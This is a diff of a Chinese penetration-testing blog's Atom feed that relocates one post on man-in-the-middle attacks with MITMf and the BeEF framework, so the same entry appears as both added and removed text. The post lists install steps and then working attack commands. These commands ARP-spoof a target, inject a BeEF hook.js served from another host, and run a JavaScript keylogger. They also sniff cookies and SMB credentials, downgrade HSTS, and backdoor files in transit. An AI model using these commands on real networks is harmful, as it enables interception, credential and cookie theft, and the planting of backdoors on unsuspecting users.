@@ -412,6 +412,46 @@
   </entry>
   
   <entry>
+    <title>Mitmf中间人攻击结合beef框架XSS攻击</title>
+    <link href="http://c.cat.plus/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
+    <id>http://c.cat.plus/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</id>
+    <published>2015-05-26T11:23:36.000Z</published>
+    <updated>2020-05-25T08:24:53.942Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a><strong>中间人攻击</strong></h3></blockquote><h4 id="注入XSS"><a href="#注入XSS" class="headerlink" title="注入XSS"></a><strong>注入XSS</strong></h4><ul><li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码</li><li>一旦得手，影响范围巨大</li><li>如果中间人发生在运营商线路上，很难引起用户注意</li></ul><h4 id="Mitmf-安装"><a href="#Mitmf-安装" class="headerlink" title="Mitmf 安装"></a><strong>Mitmf</strong> 安装</h4><ul><li>曾经号称最好用的中间人攻击工具(kali 2.0后默认未安装)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilterqueue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</span><br><span class="line">apt-get install mitmf</span><br><span class="line">pip uninstall twisted</span><br><span class="line">wget http:&#x2F;&#x2F;twistedmatrix.com&#x2F;Releases&#x2F;Twisted&#x2F;15.5&#x2F;Twisted15.5.0.tar.bz2</span><br><span class="line">pip install .&#x2F;Twisted-15.5.0.tar.bz2</span><br></pre></td></tr></table></figure></li><li>启动beef<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;share&#x2F;beef-xss&#x2F;</span><br><span class="line">.&#x2F;beef</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">* mitmf中间人注入xss脚本</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 1.1.1.1 --target 1.1.1.2 --inject --js-url http:&#x2F;&#x2F;1.1.1.3:3000&#x2F;hook.js</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger</span><br><span class="line"></span><br><span class="line">--upsidedownternet、--screen(&#x2F;var&#x2F;log&#x2F;mitmf)#颠倒图片及屏幕快照</span><br><span class="line">--ferretng（cookie）、--browserprofiler(浏览器及插件信息)#嗅探cookie及浏览器插件信息</span><br><span class="line">--smbtrap、--smbauth#smb身份认证信息嗅探</span><br><span class="line"></span><br><span class="line">--hsts#协议降级攻击</span><br><span class="line">HTTP Strict Transport Security</span><br><span class="line">防止协议降级、cookie窃取</span><br><span class="line">安全策略通过HTTP响应头”Strict-Transport-Security“实施</span><br><span class="line">限制user-agent、https等</span><br><span class="line"></span><br><span class="line">--filepwn </span><br><span class="line">凌空插后门,传输过程中插入后门</span><br></pre></td></tr></table></figure></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;blockquote&gt;
+&lt;h3 id=&quot;中间人攻击&quot;&gt;&lt;a href=&quot;#中间人攻击&quot; class=&quot;headerlink&quot; title=&quot;中间人攻击&quot;&gt;&lt;/a&gt;&lt;strong&gt;中间人攻击&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
+&lt;h4 id=&quot;注入XSS&quot;&gt;&lt;a
+      
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="密码攻击" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/"/>
+    
+      <category term="嗅探欺骗" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/%E5%97%85%E6%8E%A2%E6%AC%BA%E9%AA%97/"/>
+    
+    
+      <category term="arpspoof" scheme="http://c.cat.plus/tags/arpspoof/"/>
+    
+      <category term="dnsspoof" scheme="http://c.cat.plus/tags/dnsspoof/"/>
+    
+      <category term="Mitmf" scheme="http://c.cat.plus/tags/Mitmf/"/>
+    
+      <category term="XSS" scheme="http://c.cat.plus/tags/XSS/"/>
+    
+      <category term="beef" scheme="http://c.cat.plus/tags/beef/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Ettercap中间人攻击</title>
     <link href="http://c.cat.plus/2015/05/26/Password_Attacks/Ettercap%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
     <id>http://c.cat.plus/2015/05/26/Password_Attacks/Ettercap%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</id>
@@ -449,46 +489,6 @@
       <category term="PTH" scheme="http://c.cat.plus/tags/PTH/"/>
     
       <category term="中间人攻击" scheme="http://c.cat.plus/tags/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Mitmf中间人攻击结合beef框架XSS攻击</title>
-    <link href="http://c.cat.plus/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
-    <id>http://c.cat.plus/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</id>
-    <published>2015-05-26T11:23:36.000Z</published>
-    <updated>2020-05-25T08:24:53.942Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a><strong>中间人攻击</strong></h3></blockquote><h4 id="注入XSS"><a href="#注入XSS" class="headerlink" title="注入XSS"></a><strong>注入XSS</strong></h4><ul><li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码</li><li>一旦得手，影响范围巨大</li><li>如果中间人发生在运营商线路上，很难引起用户注意</li></ul><h4 id="Mitmf-安装"><a href="#Mitmf-安装" class="headerlink" title="Mitmf 安装"></a><strong>Mitmf</strong> 安装</h4><ul><li>曾经号称最好用的中间人攻击工具(kali 2.0后默认未安装)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilterqueue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</span><br><span class="line">apt-get install mitmf</span><br><span class="line">pip uninstall twisted</span><br><span class="line">wget http:&#x2F;&#x2F;twistedmatrix.com&#x2F;Releases&#x2F;Twisted&#x2F;15.5&#x2F;Twisted15.5.0.tar.bz2</span><br><span class="line">pip install .&#x2F;Twisted-15.5.0.tar.bz2</span><br></pre></td></tr></table></figure></li><li>启动beef<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;share&#x2F;beef-xss&#x2F;</span><br><span class="line">.&#x2F;beef</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">* mitmf中间人注入xss脚本</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 1.1.1.1 --target 1.1.1.2 --inject --js-url http:&#x2F;&#x2F;1.1.1.3:3000&#x2F;hook.js</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger</span><br><span class="line"></span><br><span class="line">--upsidedownternet、--screen(&#x2F;var&#x2F;log&#x2F;mitmf)#颠倒图片及屏幕快照</span><br><span class="line">--ferretng（cookie）、--browserprofiler(浏览器及插件信息)#嗅探cookie及浏览器插件信息</span><br><span class="line">--smbtrap、--smbauth#smb身份认证信息嗅探</span><br><span class="line"></span><br><span class="line">--hsts#协议降级攻击</span><br><span class="line">HTTP Strict Transport Security</span><br><span class="line">防止协议降级、cookie窃取</span><br><span class="line">安全策略通过HTTP响应头”Strict-Transport-Security“实施</span><br><span class="line">限制user-agent、https等</span><br><span class="line"></span><br><span class="line">--filepwn </span><br><span class="line">凌空插后门,传输过程中插入后门</span><br></pre></td></tr></table></figure></li></ul>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;blockquote&gt;
-&lt;h3 id=&quot;中间人攻击&quot;&gt;&lt;a href=&quot;#中间人攻击&quot; class=&quot;headerlink&quot; title=&quot;中间人攻击&quot;&gt;&lt;/a&gt;&lt;strong&gt;中间人攻击&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
-&lt;h4 id=&quot;注入XSS&quot;&gt;&lt;a
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="密码攻击" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/"/>
-    
-      <category term="嗅探欺骗" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/%E5%97%85%E6%8E%A2%E6%AC%BA%E9%AA%97/"/>
-    
-    
-      <category term="arpspoof" scheme="http://c.cat.plus/tags/arpspoof/"/>
-    
-      <category term="dnsspoof" scheme="http://c.cat.plus/tags/dnsspoof/"/>
-    
-      <category term="Mitmf" scheme="http://c.cat.plus/tags/Mitmf/"/>
-    
-      <category term="XSS" scheme="http://c.cat.plus/tags/XSS/"/>
-    
-      <category term="beef" scheme="http://c.cat.plus/tags/beef/"/>
     
   </entry>
   
